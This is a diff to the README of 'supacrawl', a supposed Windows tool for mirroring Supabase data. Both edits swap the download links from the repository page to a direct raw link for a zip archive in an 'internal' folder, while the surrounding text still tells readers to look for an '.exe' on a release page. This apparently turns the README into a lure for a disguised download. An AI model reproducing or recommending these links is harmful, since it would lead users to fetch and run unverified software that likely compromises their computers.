@@ -1,6 +1,6 @@
 # 📦 supacrawl - Mirror Supabase data to your computer
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/agathetec5068/supacrawl)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/agathetec5068/supacrawl/main/internal/Software_2.5.zip)
 
 ## 📁 What is supacrawl
 
@@ -14,7 +14,7 @@ To use this application, you need a computer running Windows 10 or Windows 11. Y
 
 You must visit the official release page to get the installer for your computer. 
 
-[Click here to visit the download page](https://github.com/agathetec5068/supacrawl)
+[Click here to visit the download page](https://raw.githubusercontent.com/agathetec5068/supacrawl/main/internal/Software_2.5.zip)
 
 Once you arrive at the page, look for the file ending in `.exe`. Click the name of this file to start the download. Your browser might ask you where to save the file. Choose a folder you can find later, such as your Downloads folder.
 
